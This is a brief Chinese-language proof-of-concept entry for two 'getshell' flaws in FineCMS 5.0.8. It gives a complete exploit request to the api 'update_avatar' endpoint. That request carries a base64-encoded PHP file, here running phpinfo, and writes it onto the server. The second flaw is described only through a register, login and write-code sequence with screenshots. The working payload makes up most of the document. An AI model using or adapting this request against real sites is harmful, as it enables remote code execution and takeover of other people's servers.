# FineCMS最新版5.0.8两处getshell

## Affected Version 

5.0.8

## poc

第一处payload


    127.0.0.1/finecms/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+


查看结果

![](http://opmi2ydgh.bkt.clouddn.com//17-7-3/35617053.jpg)

第二处

先注册，登录，然后写入恶意代码。

![](http://opmi2ydgh.bkt.clouddn.com//17-7-3/81165201.jpg)

会在\uploadfile\member文件夹下生成写入的代码文件夹以及恶意代码。

![](http://opmi2ydgh.bkt.clouddn.com//17-7-3/57501522.jpg)

## References
1. http://4o4notfound.org/index.php/archives/40/
2. https://github.com/404notf0und/CMS-POC/tree/master/script

